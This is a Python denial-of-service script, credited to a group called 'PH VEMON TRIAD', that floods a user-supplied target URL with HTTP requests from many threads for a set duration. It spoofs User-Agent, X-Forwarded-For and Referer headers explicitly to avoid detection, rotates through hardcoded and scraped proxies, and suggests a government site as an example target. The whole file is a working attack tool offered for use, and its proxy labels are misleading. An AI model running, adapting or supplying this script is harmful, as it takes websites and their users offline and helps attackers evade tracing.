import requests, threading, random, time, socket
from datetime import datetime




print(r"""
    ____  _____ ____ _____ ____   _____   __  ____  _   _ 
 |  _ \| ____/ ___|_   _|  _ \ / _ \ \ / / |  _ \| | | |
 | | | |  _| \___ \ | | | |_) | | | \ V /  | |_) | |_| |
 | |_| | |___ ___) || | |  _ <| |_| || |   |  __/|  _  |
 |____/|_____|____/ |_| |_| \_\\___/ |_|   |_|   |_| |_|
                                                        

                          [  Code By D3STR0Y3R & SYNX4 ]     
                     
                       TEAM : PH VEMON TRIAD                                                                                            
""")


# INPUTS
url = input("Target Or Url: ")  # contoh: https://example.gov
duration = int(input("TIMES: "))
threads = int(input("THREADS: "))
use_proxy = input("PROXY? (y/n): ").lower() == 'y'

# PROXY SERVER READY-TO-USE (UPDATE SESUKA LO)
proxy_list = [
    "142.250.179.174:8080",  # Google Proxy (contoh)
    "185.222.224.193:8080",   # Cloudflare Proxy
    "192.0.78.24:8080",       # IANA Proxy
    "103.86.1.9:8080",        # Singapore Proxy
    "104.248.142.72:8080",     # USA Proxy
]
print(f"TEMUKAN {len(proxy_list)} PROXY SIAP PAKAI")


# HEADER VARIANTS BIAR TIDAK DETEKSI
headers = [
    {'User-Agent': f'Mozilla/{random.randint(4,5)}.{random.randint(0,9)} (compatible; DDOS-BOT/{random.randint(1,3)}.0)'},
    {'User-Agent': f'Googlebot-Image/{random.randint(1,2)}.{random.randint(0,3)}'},
    {'User-Agent': f'curl/7.{random.randint(50,70)} (x86_64-pc-linux-gnu)'}
]

# PROXY ROTATION
if use_proxy:
    proxy_list = []
    try:
        from bs4 import BeautifulSoup
        import requests
        html = requests.get("https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&anonymity=Elite&timeout=20000").text
        soup = BeautifulSoup(html, "html.parser")
        for row in soup.select("table#proxylisttable tbody tr"):
            tds = row.find_all("td")
            if tds[4].text == "elite proxy":
                proxy_list.append(f"{tds[0].text}:{tds[1].text}")
        print(f"TEMUKAN {len(proxy_list)} PROXY ELITE")
    except Exception as e:
        print("ERROR FETCH PROXY, GUNAKAN TANPA PROXY")

# FUNCTION DDOS
def ddos_attack():
    while (datetime.now() - start_time).seconds < duration:
        try:
            headers_random = random.choice(headers)
            headers_random['X-Forwarded-For'] = socket.inet_ntoa(random._urandom(4))
            headers_random['Referer'] = random.choice([
                'https://www.google.com/search?q=',
                'https://www.bing.com/search?q=',
                'https://duckduckgo.com/?q='
            ]) + url.split("//")[1].split("/")[0]
            
            if use_proxy and proxy_list:
                proxy = random.choice(proxy_list)
                proxies = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                requests.get(url, headers=headers_random, proxies=proxies, timeout=5)
            else:
                requests.get(url, headers=headers_random, timeout=5)
            print(f"[{datetime.now().strftime('%H:%M:%S')}] DOWN BY [ PH V3MON TRIAD ]")
        except Exception as e:
            print(f"[ERROR] {str(e)}")

# START ATTACK
start_time = datetime.now()
print(f"MEMULAI ATTACK {url} SELAMA {duration} DETIK DENGAN {threads} THREADS")

for _ in range(threads):
    t = threading.Thread(target=ddos_attack)
    t.start()
    